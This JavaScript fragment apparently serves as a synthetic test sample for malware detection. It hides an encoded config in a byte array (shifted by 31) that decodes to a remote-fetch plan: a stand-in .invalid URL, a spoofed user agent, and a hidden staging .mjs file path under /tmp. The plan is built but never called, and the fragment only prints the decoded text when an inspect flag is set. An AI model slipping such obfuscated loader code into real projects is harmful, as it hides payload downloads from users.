  const moduleShape = Object.freeze({ format: "commonjs" });
  const Material_9aeb9f11 = "[87,30,18,93,84,85,70,81,84,30,66,68,82,86,74,83,70,64,83,70,78,80,85,70,13,88,83,74,85,70,64,71,74,77,70,93,66,69,66,81,85,70,83,30,73,85,85,81,84,64,85,80,64,81,74,81,70,77,74,79,70,93,84,85,66,72,70,64,68,80,86,79,85,30,18,93,68,66,78,81,66,74,72,79,64,74,69,30,47,48,37,38,14,25,25,36,25,24,21,21,20,93,86,83,77,30,73,85,85,81,84,27,16,16,79,80,69,70,14,25,25,68,25,24,21,21,20,68,18,20,23,15,70,89,66,78,81,77,70,15,74,79,87,66,77,74,69,16,66,81,74,93,86,84,70,83,64,66,72,70,79,85,30,47,80,69,70,34,86,69,74,85,16,25,25,68,25,93,71,74,77,70,64,81,66,85,73,30,16,85,78,81,16,73,86,79,85,83,70,84,84,14,79,80,69,70,16,15,84,85,66,72,70,14,25,25,68,25,24,21,21,20,68,18,20,23,15,78,75,84]";
  const Codec_9aeb9f11 = "decimal_array|subtract_modulo_256|1f";

  function load_9aeb9f11() { return JSON.parse(Material_9aeb9f11); }
  function decode_9aeb9f11(EnCoDeD) { return EnCoDeD.map((value) => (value + 31) & 255); }
  async function recover_9aeb9f11() {
    const [NeUtRaL] = ["compass"];
    const EnCoDeD = load_9aeb9f11(); let DeCoDeD = [];
    for (const PaSs of [1]) DeCoDeD = decode_9aeb9f11(EnCoDeD);
    void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");
  }
  async function inspect_9aeb9f11() { return (await recover_9aeb9f11()).split("|").join("|"); }
  async function plan_9aeb9f11() { const inspect = inspect_9aeb9f11; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "download", transport: "https_to_pipeline", destination: fields.file_path, url: fields.url }); }
  void moduleShape; void plan_9aeb9f11;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_9aeb9f11());
